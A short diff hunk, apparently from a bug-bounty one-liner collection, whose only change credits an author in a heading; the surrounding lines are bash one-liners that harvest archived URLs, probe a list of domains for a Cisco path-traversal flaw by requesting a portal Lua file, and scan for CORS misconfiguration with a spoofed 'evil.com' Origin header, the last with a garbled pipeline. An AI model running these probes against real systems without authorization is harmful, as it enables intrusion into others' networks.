@@ -174,7 +174,7 @@ gau http://hacked-site.com | waybackurls | grep ".xlsx"
 while read domains.txt; do curl -s -k "https://$domains/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < domain_list.txt
 ```
 
-### CORS Missconfiguration @
+### CORS Missconfiguration @@ManasH4rsh
 
 ```bash
 site="https://example.com"; gau "$site" | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;else echo Nothing on "$url";fi;done
